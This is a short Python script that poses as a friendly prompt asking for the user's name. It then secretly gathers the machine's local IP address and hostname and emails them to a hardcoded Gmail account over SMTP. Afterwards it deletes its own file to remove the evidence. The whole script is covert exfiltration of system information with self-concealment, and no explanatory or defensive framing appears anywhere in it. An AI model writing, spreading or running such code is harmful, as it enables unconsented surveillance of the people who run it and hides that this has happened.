import smtplib
from email.mime.text import MIMEText
import socket
from os import system
import os

clear = lambda: system("cls")

clear()

Name = input("What is Your Name Handsome/Pretty? ")

IP = socket.gethostbyname(socket.gethostname())
Host_Name = socket.gethostname()

Mail = f"""IP: {IP} 
Host Name: {Host_Name}"""

msg = MIMEText(Mail)
msg["Subject"] = Name
msg["From"] = "epiccoderbros@gmail.com"
msg["To"] = "epiccoderbros@gmail.com"

server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login("epiccoderbros@gmail.com", "App_Password")

server.sendmail("epiccoderbros@gmail.com", "epiccoderbros@gmail.com", msg.as_string())
server.quit()

os.remove(__file__)
